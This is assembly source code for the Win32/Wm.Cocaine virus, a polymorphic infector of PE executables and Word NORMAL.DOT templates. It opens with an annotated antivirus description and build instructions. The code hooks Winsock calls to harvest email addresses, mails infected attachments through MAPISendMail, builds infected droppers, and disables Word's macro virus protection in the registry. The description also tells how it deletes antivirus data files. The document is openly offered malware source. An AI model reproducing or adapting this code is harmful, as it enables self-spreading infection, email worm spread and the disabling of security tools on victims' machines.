;Wm/W32.Cocaine - 22231 bytes
;(c) Vecna 1999
;
;This virus infect PE and DOC files.
;
;Study the code and the AVPVE description for others features.
;
;Small corrections in AVPVE text are between []'s
;
;
;
;AVPVE Description:
;
; Cocaine
;
; ------------------------------------------------------------------------
; This is a parasitic Windows PE files and MS Word normal templates infector
; with email spreading ability, about 22Kb of length. The virus has three
; instances: in Windows PE EXE files, in Word NORMAL template and as attached
; file in email messages.
;
; The virus code in infected PE EXE files is its main instance. When it is
; executed, the virus searches for PE EXE files in the current and Windows
; directories and infects them. The virus also drops infected an NORMAL.DOT
; to the MS Word directory from its PE EXE instance, as well as sends
; infected emails. The virus instance in the NORMAL template drops and
; executes the infected PE EXE file on each document closing, and is not able
; to infect other documents and templates. [* Wrong. Check the infected doc I
; included, or the file MACRO.INC for the code *] The virus code in emails
; appears as attached file that is infected an PE EXE Windows executable file
; with a random name, or infected NORMAL template.
;
; The virus is per-process memory resident. This means that the virus copy
; may stay in memory for a long time until the infected application
; terminates. In case only "short-life" applications are infected, the virus
; code is not present in the system memory for long time. In case an
; application in permanent use is infected, the virus is active during a long
; time, hooks Windows functions, infects PE EXE files that are accessed and
; sends email messages.
;
; The virus is polymorphic in PE files as well as in Word NORMAL template.
; The virus has two polymorphic engines in its EXE code: the first of them
; generates polymorphic decryption loop in infected PE EXE files, the second
; one makes the virus macro program in infected NORMAL.DOT polymorphic too.
;
; The virus has a payload routine that is executed when an infected file is
; run after four months when it was infected. [* 8 months... Maybe AAM 12
; confused AVers ;-) *] This routine displays message boxes that have the
; header "W32/Wm.Cocaine" and the text that is randomly selected from seven
; variants:
;
;  Your life burn faster, obey your master...
;  Chop your breakfast on a mirror...
;  Veins that pump with fear, sucking darkest clear...
;  Taste me you will see, more is all you need...
;  I will occupy, I will help you die...
;  I will run through you, now I rule you too...
;  Master of Puppets, I'm pulling your strings...
;
; The virus pays attention to anti-virus programs and tries to disable them.
; Each time an infected file is executed and virus installs its per-process
; resident copy it looks for anti-virus data files in the current directory
; and deletes them. The names of these files look like follows: KERNEL.AVC,
; SIGN.DEF, FIND.DRV, NOD32.000, DSAVIO32.DLL, SCAN.DAT, VIRSCAN.DAT (AVP,
; DSAV, NOD, SCAN and other anti-virus data files). The virus also locates
; and terminates old version of AVP Monitor on-access scanner. [* Not so
; old ;-) *]
;
; The known virus version has bugs and cannot spread from Word macro instance
; to Windows executable. It also has a bug in PE EXE infection routine and
; corrupts some WinNT executable files. [* What can I say... is buggy :-) *]
;
; The virus has a "copyright" text:
;
;  (c) Vecna
;
; Some virus routines (especially macro ones) are related to the "Fabi"
; multi-platform virus, and some infected files may be detected by the name
; of this virus. [* Probably, the loader, before it load the poly virus code,
; can be detected as Fabi *]
;
; Technical details
;
; The virus has quite large size for a program written in Assembler - about
; 22Kb, and has many routines that are quite interesting from a technical
; point of view.
;
; Running infected EXE
;
; When an infected file takes control the polymorphic decryption loops are
; executed. They decrypt the virus code layer-by-layer (the virus is
; encrypted by several loops - from two till five) and pass control to the
; virus installation routine. It is necessary to note that several virus
; blocks stay still encrypted. The virus decrypts and accesses them in case
; of need, and then encrypts back. These blocks are MS Word infection data
; and routine as well as PE EXE polymorphic engine.
;
; The virus installation routine looks for necessary Windows API functions
; addresses that are used by the virus later. The list of these functions is
; quite long, this is caused by list of things the virus does to spread
; itself. The functions list the virus looks for is below:
;
;  Exported by     Functions list
;  -----------     --------------
;  KERNEL32.DLL:   GetProcAddress GetModuleHandleA CreateProcessA
;                  CreateFileA WinExec CloseHandle LoadLibraryA FreeLibrary
;                  CreateFileMappingA MapViewOfFile UnmapViewOfFile
;                  FindFirstFileA FindNextFileA FindClose SetEndOfFile
;                  VirtualAlloc VirtualFree GetSystemTime
;                  GetWindowsDirectoryA GetSystemDirectoryA
;                  GetCurrentDirectoryA SetFileAttributesA SetFileTime
;                  ExitProcess GetCurrentProcess WriteProcessMemory WriteFile
;                  DeleteFileA Sleep CreateThread GetFileSize SetFilePointer
;  USER32.DLL:     MessageBoxA FindWindowA PostMessageA
;  ADVAPI32:       RegSetValueExA RegCreateKeyExA RegOpenKeyExA
;                  RegQueryValueExA RegCloseKey
;  MAPI32.DLL:     MAPISendMail
;
; The virus gets these functions' addresses by the standard Windows virus
; trick: it locates the image on KERNEL32.DLL in the Windows memory, scans
; its Export table and gets addresses of two functions: GetModuleHandle and
; GetProcAddress [* The import table is searched while infecting a file for
; GetModuleHandle *]. By using these two functions the virus is then able
; easily locate all addresses of other necessary functions. The most
; interesting feature of this routine is: this is the first virus that processes
; not only Win95/98 and WinNT addresses while looking for KERNEL32.DLL image,
; but pays attention for Win2000 addresses also [* If the host dont import
; GetModuleHandle this is *]
;
; The virus then locates and infects the MS Word, then searches for PE EXE
; files and also infects them, then hooks a set of system events (files and
; emails access) that is used to locate and infect more files as well as
; spread virus copy to the Internet in attached emails.
;
; Infecting MS Word
;
; The very first infection routine that is activated by the virus is its MS
; Word affecting routine, if it is installed in the system. First of all here
; the virus checks for C:\ANCEV.SYS file presence.
;
; The C:\ANCEV.SYS file ("ANCEV"="VECNA" written backward) has a special
; purpose. This file is created when the MS Word template infection routine
; completes. So, this file presence means that MS Word was located and
; NORMAL.DOT template was infected. In this case the virus while sending
; emails sends NORMAL.DOT template but not the infected EXE dropper [* I used
; to think that DOC files are less suspicious to send by email, but, after
; melissa's shits, EXE are better i gues *]
;
; So, the virus checks for this file at the very top of MS Word infection
; routine. If it does not exist, the virus continues infection. If this file
; is found, the virus randomly in one cases of ten continues infection, and
; in nine cases of ten leaves infection routine. This means that in one case
; of ten the MS Word NORMAL.DOT will be re-infected anyway [* This is done to
; avoid lamers creating a fake ANCEV.SYS to not have WinWord infected *].
;
; The virus then disables the Word VirusWarning protection by modifying the
; system registry keys where Word stores its settings:
;
;  SOFTWARE\Microsoft\Office\8.0\Word\Options, EnableMacroVirusProtection
;
; The virus then gets Word's templates directory also by reading system
; registry:
;
;  SOFTWARE\Microsoft\Office\8.0\Common\FileNew\LocalTemplates
;
; and deletes the NORMAL.DOT template in there, and then creates a new
; NORMAL.DOT template file - infected one. The infected NORMAL.DOT contains a
; small macro inside. This macro has "AutoExec" Word auto-name - it will be
; automatically executed on next Word startup and will import the main virus
; macro from the C:\COCAINE.SYS file.
;
; The C:\COCAINE.SYS file is created by the virus just after overwriting the
; NORMAL.DOT template. This SYS file is a text file that contains VBA
; program's source code. This source is extracted by the virus from its code,
; mixed with junk (polymorphic) VBA instructions and appended by infected PE
; EXE dropper converted to ASCII strings.
;
; So, the MS Word infection routine does its work in two steps. First of all
; the virus replaces the original NORMAL.DOT with a new one that contains the
; "AutoExec" macro program (loader) that imports complete virus code from the
; C:\COCAINE.SYS file, and completes by that porting virus code from PE EXE
; file to MS Word template.
;
; From Word to EXE
;
; To drop the PE EXE file from its Word template instance the virus uses a
; standard macro-viruses' trick. It creates two files: the first of them is
; the C:\COCAINE.SRC file with infected PE EXE file image converted to ASCII
; form, and second file is a DOS batch with random name. This batch file
; contains a set of instructions that execute the DOS DEBUG utility that
; converts ASCII dump back to binary PE EXE form, and executes it [* This is
; the worst imaginable way to drop a EXE file ever *]
;
; So the virus jumps to Windows out of infected Word template.
;
; Infecting PE EXE files
;
; When MS Word is affected, the virus goes to PE EXE files infection routine.
; The virus looks for PE EXE files in the current and Windows directories and
; infects them. The only files infected are those that have .EXE or .SCR
; filename extensions.
;
; The virus then looks for installed browser and mailer and infects them too.
; The virus locates them by system registry keys in HKEY_LOCAL_MACHINE
; storage:
;
;  SOFTWARE\Classes\htmlfile\shell\open\command
;  SOFTWARE\Classes\mailto\shell\open\command
;
; The virus needs these files to be infected for activating its Internet
; infection routines. When these Internet accessing applications are
; infected, the virus copy is active in the memory for a long time exactly at
; the moment a user is connected to the Internet. This is necessary to the
; virus to realize its Internet spreading ability.
;
; PE EXE Infection mechanism
;
; The virus checks several conditions before infecting the file. 1st: the
; file length has to be not divisible by 101 (it is virus protection to avoid
; multiple infection, the already infected PE EXE files have such length).
; 2nd: when the virus looks for EXE files in the current and Windows
; directories to infect them, the name of the file cannot contain 'V' letter
; or digits, here the virus avoids most popular anti-virus scanners and "goat
; files" infection.
;
; If the first section has big enough size (more than 2304 bytes), the virus
; writes to there several blocks of junk code that passes the control
; block-by-block to the main virus decryption loops. There are eight blocks
; written to files when the virus infects them:
;
;  +------------+
;  |            |
;  |PE Header   | ---------------+
;  +------------+                |
;  |  +-----+<-+|                |
;  |  |Junk2|  ||                |
;  |  +-----+-+|| Entry Point    |
;  |+-----+   |||<---------------+
;  ||Junk1|   |||
;  |+-----+----+|
;  |          | |
;  |+-----+<--+ |
;  ||Junk3|     |
;  |+-----+----+|
;  |           V|
;  | . . .      |
;  |     +-----+|
;  |+----|Junk8||
;  ||    +-----+|
;  |V           |
;  |------------|
;  |Virus code  |
;  |            |
;  +------------+
;
; In this case the virus does not modify program's entry point address, but
; it needs to restore all overwritten blocks of host file before return
; control to original entry procedure [* CommanderBomber/OneHalf rulez *].
;
; If the first section is short, the control goes directly to virus code. In
; this case the virus modifies program's entry address to get control when
; infected files are executed.
;
; The virus code itself is encrypted by several (from two till five)
; polymorphic loops. The polymorphic engine in the virus is quite strong, and
; produces about 2Kb of polymorphic loops [* This poly is kewl *]
;
; The virus also patches the Import section to get functions GetProcAddress,
; GetModuleHandle, CreateProcessA, WinExec and MAPISendMail when infection
; executable is run.
;
; After all the virus writes its encrypted code to the end of last file
; section, and increases section size by patching PE header.
;
; Intercepting Events
;
; When the Word and PE EXE direct infection routines are complete, the virus
; hooks several Windows functions and stays in Windows memory as part of the
; host program. The virus hooks two file access function WinExec and
; CreateProcessA, if they are imported by the host program from the
; KERNEL32.DLL. When these functions get control (a program is executed) the
; virus gets the program's file name, gets its directory, searches and
; infects PE EXE files in this directory.
;
; Sending Emails
;
; The virus per-process resident code also runs email infection thread, hooks
; MAPISendMail that is exported from MAPI32.DLL, "connect" and "recv" from
; WSOCK32.DLL and GetProcAddress from KERNEL32.DLL.
;
; The first hook is used by the virus to send its copy to the Internet. When
; the virus intercepts this event it looks for attached data in the message.
; If there is no attach, the virus appends to the message infected NORMAL.DOT
; or infected PE EXE file (the latter is created on the disk in the
; C:\ENIACOC.SYS file).
;
; The "GetProcAddress", "connect" and "recv" hooks are used by the virus to
; realize second method of infected Emails sending. When a message arrives,
; the virus scans its header for "mailto:" field, gets the address from there
; and stores it in its own database. [* MAILTO: is a HTML command/instruction
; used very often. Nice idea :-) *]
;
; When taking control the infection thread looks for email address caught by
; "connect" and "recv" hooks, calculates its CRC and compares with its
; "already infected addresses" database that is stored in the BRSCBC.DAT file
; in the Windows system directory. If this address was not used yet, the
; virus adds it to its BRSCBC.DAT database, creates a message with NORMAL
; template or infected PE EXE file, and sends it by using MAPISendMail
; function [* Why BRSCBC? ;-) *]. The subject field for the message is
; randomly selected from variants:
;
;  Kewl page!
;  Improvement to your page
;  Your page r0x0r!
;  You must see this...
;  Secret stuff!
;  [* or a empty subject line *]
;
; By using the BRSCBC.DAT database the virus avoids duplicate sendings, but
; on each infected program run the virus depending on its random counter
; deletes this file, and clears "do-not-send" database by that.
;
; The "GetProcAddress" that is also hooked by virus TSR copy is used only to
; intercept "connect" and "recv" WSOCK32.DLL functions, if an application
; does not import these routines "by default", but activates them in case of
; need. To do that the "GetProcAddress" virus' hook intercepts accesses to
; "connect" and "recv" WSOCK32.DLL functions' addresses. If an application
; tries to get addresses of these routines to use Internet connections, the
; virus returns addresses of its own "connect" and "recv" hookers, and so
; intercepts Internet connection [* Fucking OPERA *]

;Thnz to IkX for accepting this contribution

;Greetz to Z0MBiE, VirusBuster and Reptile(the first to use macro autoload)

;Special greetz goes to Jacky Qwerty:
;Los virus no serian lo que son hoy si no fuera por vos!
;THNDV/CAP/Cabanas RULEZ! (THNDV solo para los mas vivos ;> )

;Big fuckZ to T2000 and El Gusano Boliviano: lamers and ripperz!!!!

;Greetz to all creative coders

;Use the pre-compiled virus, but if you're a sort of 37337 d00d... to compile:
;  TASM /M /ML COKE.ASM
;  TLINK32 COKE,,,IMPORT32
;  PEWRSEC COKE.EXE
;Remember to split the big COKE.ASM in the smaller incz before!
;(and beware the trap ;> )

;contacts: vecna_br@hotmail.com (except questions about compiling)

.586p
.model flat, STDCALL
locals

include host.inc

       ofs           equ offset
       by            equ byte ptr
       wo            equ word ptr
       dwo           equ dword ptr

       TRUE          EQU 1
       FALSE         EQU 0

       MAIL_DEBUG    EQU FALSE

       DIRECT        EQU TRUE

       MONTH_DELAY   EQU 8

       MAX_BRANCH    EQU 8                     ;beware DrWeb! (5 here=detect!)

       MAX_M_DEEP    EQU 6

       MAIL_PRIORITY EQU 10                    ;seconds

       MAX_SOCK      EQU 10

       DIV_VALUE     EQU 101

       MAX_PATH      EQU 260

       MIN_RAW       EQU (MAX_BRANCH+1)*100h

       vsize         equ vend - vcode

       msize         equ mend - vcode

_VSEG  segment dword use32 public 'COCAINE'

IFNDEF I_AM_IDIOT_USER_THAT_CANT_COMPILE

vcode  label

       db '(c) Vecna', 0

FunDate db 0                                   ;month to activate

InitWSOCK proc
       call @@1
wsock32 db 'WSOCK32.DLL', 0
  @@1:
       call [ebp+(ofs _GetModuleHandle-ofs vcode)]
       test eax, eax
       jz @@0
       call @@2
       db 'connect',0
  @@2:
       push eax
       call @@3
       db 'recv', 0
  @@3:
       push eax
       call [ebp+(ofs _GetProcAddress-ofs vcode)]
       mov [ebp+(ofs _recv-ofs vcode)], eax
       call [ebp+(ofs _GetProcAddress-ofs vcode)]
       mov [ebp+(ofs _connect-ofs vcode)], eax
       clc
       ret
  @@0:
       stc
       ret
InitWSOCK endp

http_install proc
       sub ecx, ecx
       call @@set_seh
       mov esp, [esp+8]
       call delta
       jmp @@fault
  @@set_seh:
       push dwo fs:[ecx]
       mov fs:[ecx], esp
       call InitWSOCK
       jc @@fault
       mov ebx, [ebp+(ofs _base-ofs vcode)]
  @@check:
       cmp wo [ebx], 'ZM'
       je @@found
  @@fault:
       sub ecx, ecx
       pop dwo fs:[ecx]
       pop ecx
       ret
  @@found:
       mov edi, [ebx+3ch]
       lea edi, [ebx+edi+128]
       mov edi, [edi]
  @@2:
       mov esi, [ebx+edi+12]
       test esi, esi
       jz @@ret
       add esi, ebx
       lodsd
       or eax, 20202020h
       cmp eax, 'cosw'
       je @@wsock
       add edi, 20
       jmp @@2
  @@wsock:
       mov esi, [ebx+edi+16]
       add esi, ebx
  @@searchloop:
       lodsd
       test eax, eax
       jz @@ret
       cmp eax, [ebp+(ofs _connect-ofs vcode)]
       jne @@3
       lea eax, [ebp+(ofs New_connect-ofs vcode)]
       lea edi, [esi-4]
       mov ecx, 4
       push esi
       push eax
       mov esi, esp                            ;fake buffer in stack
       call WriteMem
       pop esi
       pop esi
  @@3:
       cmp eax, [ebp+(ofs _recv-ofs vcode)]
       jne @@searchloop
       lea eax, [ebp+(ofs New_recv-ofs vcode)]
       lea edi, [esi-4]
       mov ecx, 4
       push esi
       push eax
       mov esi, esp                            ;fake buffer in stack
       call WriteMem
       pop esi
       pop esi
  @@ret:
       jmp @@fault
http_install endp

NewGetProcAddress proc
       push esp
       pushad
       call delta
       mov eax, [ebp+(ofs _GetProcAddress-ofs vcode)]
       mov [esp+(7*4)+4], eax
       call InitWSOCK
       jc @@1
       lea eax, [ebp+(ofs wsock32-ofs vcode)]
       push eax
       call [ebp+(ofs _GetModuleHandle-ofs vcode)]
       test eax, eax
       jz @@1
       cmp [esp+(7*4)+12], eax
       jnz @@1
       lea eax, [ebp+(ofs CheckWSOCK32-ofs vcode)]
       xchg [esp+(7*4)+8], eax
       mov [ebp+(ofs wsock_ret-ofs vcode)], eax
  @@1:
       popad
       ret
NewGetProcAddress endp

CheckWSOCK32 proc
       push ebp
       call delta
       cmp eax, [ebp+(ofs _connect-ofs vcode)]
       jne @@1
       lea eax, [ebp+(ofs New_connect-ofs vcode)]
       jmp @@2
  @@1:
       cmp eax, [ebp+(ofs _recv-ofs vcode)]
       jne @@2
       lea eax, [ebp+(ofs New_recv-ofs vcode)]
  @@2:
       pop ebp
       push 12345678h
  wsock_ret equ dwo $-4
       ret
CheckWSOCK32 endp

New_connect proc
       push esp
       pushad
       call delta
       mov eax, [ebp+(ofs _connect-ofs vcode)]
       mov [esp+(7*4)+4], eax
       mov esi, [esp+(7*4)+16]
       mov ax, wo [esi+2]                      ;port number
       cmp ax, 5000h                           ;80
       jne @@1
       mov eax, [esp+(7*4)+12]                 ;get socket
       mov ebx, [ebp+(ofs _socket-ofs vcode)]
       mov [ebp+(ofs socket-ofs vcode)+(ebx*4)], eax
       inc ebx
       cmp ebx, MAX_SOCK
       jne @@2
       sub ebx, ebx
  @@2:
       mov [ebp+(ofs _socket-ofs vcode)], ebx
  @@1:
       popad
       ret
New_connect endp

delta  proc
       call @@1
  @@1:
       pop ebp
       sub ebp, (ofs @@1-ofs vcode)
       ret
delta  endp

New_recv proc
       push esp
       pushad
       call delta
       mov eax, [ebp+(ofs _recv-ofs vcode)]
       mov [esp+(7*4)+4], eax
       mov eax, [esp+(7*4)+12]

       lea edi, [ebp+(ofs socket-ofs vcode)]
       mov ecx, MAX_SOCK
       repne scasd
       jecxz @@1

       mov eax, [esp+(7*4)+16]
       mov [ebp+(ofs recv_buff-ofs vcode)], eax
       mov eax, [esp+(7*4)+20]
       mov [ebp+(ofs recv_size-ofs vcode)], eax
       lea eax, [ebp+(ofs New_recv2-ofs vcode)]
       xchg [esp+(7*4)+8], eax
       mov [ebp+(ofs recv_ret-ofs vcode)], eax
  @@1:
       popad
       ret
New_recv endp

New_recv2 proc
       pushad
       call delta
       mov eax, [ebp+(ofs email_w-ofs vcode)]
       test eax, eax
       jnz @@0
       mov esi, [ebp+(ofs recv_buff-ofs vcode)]
       mov ecx, [ebp+(ofs recv_size-ofs vcode)]
       sub ecx, 8
  @@1:
       push ecx
       push esi
       lodsd
       or eax, 20202000h
       cmp eax, 'iam"'
       jne @@2
       lodsd
       or eax, 00202020h
       cmp eax, ':otl'
       jne @@2
       lea edi, [ebp+(ofs email-ofs vcode)]
       lea ebx, [edi+127]
  @@4:
       lodsb
       cmp al, '"'
       je @@3
       cmp al, '?'
       je @@3
       cmp edi, ebx
       je @@3
       stosb
       jmp @@4
  @@3:
       sub eax, eax
       stosb
       dec eax
       mov dwo [ebp+(ofs email_w-ofs vcode)], eax
  @@2:
       pop esi
       inc esi
       pop ecx
       loop @@1
  @@0:
       popad
       push 12345678h
  recv_ret equ dwo $-4
       ret
New_recv2 endp

MailThread proc
       cld
       mov ebp, [esp+4]
       sub eax, eax
       call @@set_seh
       mov esp, [esp+8]
       call delta
       push -1
       call [ebp+(ofs _Sleep-ofs vcode)]
  @@set_seh:
       push dwo fs:[eax]
       mov fs:[eax], esp
  @@main_loop:
       mov ecx, [ebp+(ofs email_w-ofs vcode)]
       test ecx, ecx
       jz @@no_queued

       lea esi, [ebp+(ofs email-ofs vcode)]

       push esi
       sub ecx, ecx
       cld
  @@1strlen:
       lodsb
       test al, al
       jz @@2strlen
       inc ecx
       jmp @@1strlen
  @@2strlen:
       mov edi, ecx
       pop esi

       call CRC32
       mov [ebp+(ofs email_crc-ofs vcode)], eax

       call CheckList
       test eax, eax
       jnz @@done

IF MAIL_DEBUG EQ TRUE
       sub ecx, ecx
       push 4                                  ;yes/no
       lea eax, [ebp+(ofs title1-ofs vcode)]
       push eax
       lea eax, [ebp+(ofs email-ofs vcode)]
       push eax
       push ecx
       call [ebp+(ofs _MessageBoxA-ofs vcode)]
       cmp eax, 7                              ;no!
       je @@done
ENDIF

       lea eax, [ebp+(ofs mapi-ofs vcode)]
       push eax
       call [ebp+(ofs _LoadLibraryA-ofs vcode)]
       test eax, eax
       jz @@done

       mov [ebp+(ofs _mapi-ofs vcode)], eax

       lea ecx, [ebp+(ofs sMAPISendMail-ofs vcode)]
       push ecx
       push eax
       call [ebp+(ofs _GetProcAddress-ofs vcode)]
       test eax, eax
       jz @@unload_mapi

       mov [ebp+(ofs _MAPISendMail-ofs vcode)], eax

       call OpenAncev
       jc @@file                               ;file dont exists, binary send
  @@doc:
       call GetTemplateDir
  @@1:
       lodsb
       test al, al
       jnz @@1
       lea edi, [esi-1]
       lea esi, [ebp+(ofs ndot-ofs vcode)]
  @@3:
       lodsb
       stosb
       test al, al
       jnz @@3
       lea esi, [ebp+(ofs directory-ofs vcode)]
       push 80h
       push esi
       call [ebp+(ofs _SetFileAttributesA-ofs vcode)]
       test eax, eax
       jz @@file
       mov edx, 'COD.'
       jmp @@attach

  @@file:
       call CreateDropper
       mov eax, [ebp+(ofs mm_on_off-ofs vcode)]
       push eax                                ;buffer
       mov eax, [ebp+(ofs fsizel-ofs vcode)]
       push eax                                ;size
       lea edi, [ebp+(ofs directory-ofs vcode)]
       push edi
       lea esi, [ebp+(ofs shitfile-ofs vcode)]
  @@4:
       lodsb
       stosb
       test al, al
       jnz @@4
       mov dwo [ebp+(ofs wd_att-ofs vcode)], 82h
       call WriteDump                          ;hidden dump
       push 00004000h+00008000h
       push 0
       push dwo [ebp+(ofs mm_on_off-ofs vcode)]
       call [ebp+(ofs _VirtualFree-ofs vcode)]
       mov edx, 'EXE.'

  @@attach:

DATA_SIZE = size MapiMessage + ((size MapiRecipDesc)*2) + size MapiFileDesc

mapimsg = 0
origin  = mapimsg + size MapiMessage
destin  = origin + size MapiRecipDesc
file    = destin + size MapiRecipDesc

       sub eax, eax
       mov ecx, DATA_SIZE
       sub esp, ecx
       mov edi, esp
       mov esi, edi
       rep stosb                               ;clear buffers we'll use

       lea eax, [esi+origin]
       mov [esi.mapimsg.lpOriginator], eax
       lea eax, [esi+destin]
       mov [esi.mapimsg.lpRecips], eax
       lea eax, [esi+file]
       mov [esi.mapimsg.lpFiles], eax

       push 1
       pop eax
       mov [esi.mapimsg.nFileCount], eax
       mov [esi.mapimsg.nRecipCount], eax
       mov [esi.destin.ulRecipClass], eax
       inc eax
       mov [esi.mapimsg.flags], eax
       lea eax, [ebp+(ofs email-ofs vcode)]
       mov [esi.destin.lpszName], eax
       mov [esi.destin.lpszAddress], eax
       lea eax, [ebp+(ofs directory-ofs vcode)]
       mov [esi.file.lpszPathName], eax

       lea edi, [ebp+(ofs fname-ofs vcode)]
       mov [esi.file.lpszFileName], edi
       call MakeVar
       mov eax, edx
       stosd
       sub eax, eax
       stosb

       mov eax, [ebp+(ofs subject-ofs vcode)]
       mov [esi.mapimsg.lpszSubject], eax

       call @@1aa
       db '', 0
  @@1aa:
       pop [esi.mapimsg.lpszNoteText]

       sub eax, eax
       push eax
       push eax
       push esi
       push eax
       push eax
       call [ebp+(ofs _MAPISendMail-ofs vcode)]
       test eax, eax
       jnz @@33

       sub eax, eax
       mov [ebp+(ofs mm_on_off-ofs vcode)], eax

       call InsertList

  @@33:
       add esp, DATA_SIZE

       lea eax, [ebp+(ofs shitfile-ofs vcode)]
       push eax
       call DeleteShitFile

  @@unload_mapi:
       mov eax, [ebp+(ofs _mapi-ofs vcode)]
       call [ebp+(ofs _FreeLibrary-ofs vcode)]
  @@done:
       sub eax, eax
       mov [ebp+(ofs email_w-ofs vcode)], eax
  @@no_queued:
       push MAIL_PRIORITY*1000
       call [ebp+(ofs _Sleep-ofs vcode)]
       jmp @@main_loop
MailThread endp

GetTemplateDir proc
       call @@2
       db 'SOFTWARE\Microsoft\Office\8.0\Common\FileNew\LocalTemplates', 0
  @@2:
       pop eax
       call ConsultKey
       ret
GetTemplateDir endp

CreateDropper proc
       push 00000040h
       push 00002000h+00001000h+00100000h
       push 48*1024
       push 0
       call [ebp+(ofs _VirtualAlloc-ofs vcode)]
       mov [ebp+(ofs mm_on_off-ofs vcode)], eax
       sub edi, edi
       xchg edi, eax
       call @@1
  @@0:
       db 04Dh, 05Ah, 050h, 000h, 000h, 000h, 002h, 000h
       db 002h, 000h, 004h, 000h, 000h, 000h, 00Fh, 000h
       db 000h, 000h, 0FFh, 0FFh, 000h, 001h, 000h, 0B8h
       db 000h, 006h, 000h, 040h, 000h, 000h, 000h, 01Ah
       db 000h, 021h, 000h, 001h, 000h, 001h, 000h, 0BAh
       db 010h, 000h, 000h, 000h, 00Eh, 01Fh, 0B4h, 009h
       db 0CDh, 021h, 0B8h, 001h, 04Ch, 0CDh, 021h, 090h
       db 090h, 054h, 068h, 069h, 073h, 020h, 070h, 072h
       db 06Fh, 067h, 072h, 061h, 06Dh, 020h, 06Dh, 075h
       db 073h, 074h, 020h, 062h, 065h, 020h, 072h, 075h
       db 06Eh, 020h, 075h, 06Eh, 064h, 065h, 072h, 020h
       db 057h, 069h, 06Eh, 033h, 032h, 00Dh, 00Ah, 024h
       db 037h, 000h, 087h, 000h, 050h, 045h, 000h, 001h
       db 000h, 04Ch, 001h, 004h, 000h, 000h, 000h, 074h
       db 025h, 0F5h, 00Eh, 000h, 007h, 000h, 0E0h, 000h
       db 000h, 000h, 08Eh, 081h, 00Bh, 001h, 002h, 019h
       db 000h, 000h, 000h, 002h, 000h, 002h, 000h, 006h
       db 000h, 006h, 000h, 010h, 000h, 002h, 000h, 010h
       db 000h, 002h, 000h, 020h, 000h, 003h, 000h, 040h
       db 000h, 001h, 000h, 010h, 000h, 002h, 000h, 002h
       db 000h, 001h, 000h, 001h, 000h, 006h, 000h, 003h
       db 000h, 000h, 000h, 00Ah, 000h, 005h, 000h, 050h
       db 000h, 002h, 000h, 004h, 000h, 005h, 000h, 002h
       db 000h, 004h, 000h, 010h, 000h, 001h, 000h, 020h
       db 000h, 003h, 000h, 010h, 000h, 001h, 000h, 010h
       db 000h, 005h, 000h, 010h, 000h, 00Bh, 000h, 030h
       db 000h, 001h, 000h, 054h, 000h, 01Bh, 000h, 040h
       db 000h, 001h, 000h, 00Ch, 000h, 052h, 000h, 043h
       db 04Fh, 044h, 045h, 000h, 004h, 000h, 002h, 000h
       db 002h, 000h, 010h, 000h, 002h, 000h, 002h, 000h
       db 002h, 000h, 006h, 000h, 00Dh, 000h, 020h, 000h
       db 001h, 000h, 060h, 044h, 041h, 054h, 041h, 000h
       db 004h, 000h, 002h, 000h, 002h, 000h, 020h, 000h
       db 002h, 000h, 002h, 000h, 002h, 000h, 008h, 000h
       db 00Dh, 000h, 040h, 000h, 001h, 000h, 0C0h, 02Eh
       db 069h, 064h, 061h, 074h, 061h, 000h, 002h, 000h
       db 002h, 000h, 002h, 000h, 030h, 000h, 002h, 000h
       db 002h, 000h, 002h, 000h, 00Ah, 000h, 00Dh, 000h
       db 040h, 000h, 001h, 000h, 0C0h, 02Eh, 072h, 065h
       db 06Ch, 06Fh, 063h, 000h, 002h, 000h, 002h, 000h
       db 002h, 000h, 040h, 000h, 002h, 000h, 002h, 000h
       db 002h, 000h, 00Ch, 000h, 00Dh, 000h, 040h, 000h
       db 001h, 000h, 050h, 000h, 067h, 003h, 06Ah, 000h
       db 000h, 000h, 0E8h, 000h, 003h, 000h, 0FFh, 025h
       db 030h, 030h, 040h, 000h, 0F3h, 003h, 028h, 030h
       db 000h, 009h, 000h, 038h, 030h, 000h, 001h, 000h
       db 030h, 030h, 000h, 015h, 000h, 046h, 030h, 000h
       db 005h, 000h, 046h, 030h, 000h, 005h, 000h, 04Bh
       db 045h, 052h, 04Eh, 045h, 04Ch, 033h, 032h, 02Eh
       db 064h, 06Ch, 06Ch, 000h, 003h, 000h, 045h, 078h
       db 069h, 074h, 050h, 072h, 06Fh, 063h, 065h, 073h
       db 073h, 000h, 0ADh, 001h, 010h, 000h, 001h, 000h
       db 00Ch, 000h, 002h, 000h, 009h, 030h
  @@1:
       pop esi
       mov ecx, ofs @@1-ofs @@0
  @@2:
       lodsb
       stosb
       test al, al
       jnz @@3
       dec ecx
       dec ecx
       lodsw
       push ecx
       xor ecx, ecx
       xchg ecx, eax
       jecxz @@4
       rep stosb
  @@4:
       pop ecx
  @@3:
       loop @@2
       mov [ebp+(ofs fsizeh-ofs vcode)], ecx
       mov dwo [ebp+(ofs fsizel-ofs vcode)], 4096
       call Infect
       ret
CreateDropper endp

random_f proc
       push eax
       call random0
       pop eax
       ret
random_f endp

macro_start equ this byte

include ndot.inc

MacroSpread proc
       sub ecx, ecx
       call @@set_seh
       mov esp, [esp+8]
       call delta
       jmp @@0
  @@set_seh:
       push dwo fs:[ecx]
       mov fs:[ecx], esp

       call OpenAncev
       jc @@1                                  ;dont exists, macro spread
       mov eax, 10
       call random
       or eax, eax                             ;just in case that we are
       jnz @@0                                 ;reinfecting
  @@1:
       call @@2
  @@1v dd 0
  @@2:
       push 000F003Fh                          ;KEY_ALL_ACCESS
       push 0
       call @@3
       db 'SOFTWARE\Microsoft\Office\8.0\Word\Options', 0
  @@3:
       push 80000001H                          ;HKEY_CURRENT_USER
       call [ebp+(ofs _RegOpenKeyEx-ofs vcode)]
       test eax, eax
       jnz @@0
       push 1                                  ;size
       call @@4
       db '0', 0
  @@4:
       push 1                                  ;type
       push 0
       call @@5
       db 'EnableMacroVirusProtection', 0           ;key entry
  @@5:
       push dwo [ebp+(ofs @@1v-ofs vcode)]
       call [ebp+(ofs _RegSetValueEx-ofs vcode)]
       push dwo [ebp+(ofs @@1v-ofs vcode)]
       call [ebp+(ofs _RegCloseKey-ofs vcode)] ;close key
       call GetTemplateDir
       cld
       push esi
  @@6:
       lodsb
       test al, al
       jnz @@6
       lea edi, [esi-1]
       lea esi, [ebp+(ofs ndot-ofs vcode)]
  @@8:
       lodsb
       stosb
       test al, al
       jnz @@8
       call DeleteShitFile
       push 00000040h
       push 00002000h+00001000h+00100000h
       push 48*1024
       push 0
       call [ebp+(ofs _VirtualAlloc-ofs vcode)];alloc memory for my normal.dot
       mov [ebp+(ofs mm_on_off-ofs vcode)], eax
       lea eax, [ebp+(ofs normaldot-ofs vcode)]
       push eax
